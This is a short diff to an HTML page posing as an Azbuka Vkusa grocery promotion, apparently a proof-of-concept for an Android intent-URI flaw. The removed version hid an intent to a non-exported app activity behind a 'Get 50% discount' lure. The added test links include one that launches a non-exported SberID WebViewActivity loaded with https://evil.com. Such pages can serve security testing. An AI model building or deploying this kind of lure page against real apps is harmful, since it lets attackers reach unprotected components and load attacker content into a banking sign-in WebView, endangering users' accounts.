@@ -1,6 +1,16 @@
 <html><body>
 <h1>Специальное предложение Азбука Вкуса</h1>
-<a href="intent://arbitrary#Intent;component=ru.av.vkusomania/.any.NonExportedActivity;S.key=value;end">
-  Получить скидку 50%
-</a>
+
+<p><a href="intent://#Intent;action=android.settings.SETTINGS;end">
+  Тест 1 — Открыть настройки телефона
+</a></p>
+
+<p><a href="intent://www.google.com/#Intent;scheme=https;action=android.intent.action.VIEW;end">
+  Тест 2 — Открыть Google в браузере
+</a></p>
+
+<p><a href="intent://#Intent;component=sberid.sdk.auth.view.activity.WebViewActivity;S.uri=https://evil.com;end">
+  Тест 3 — Открыть SberID WebView (non-exported)
+</a></p>
+
 </body></html>
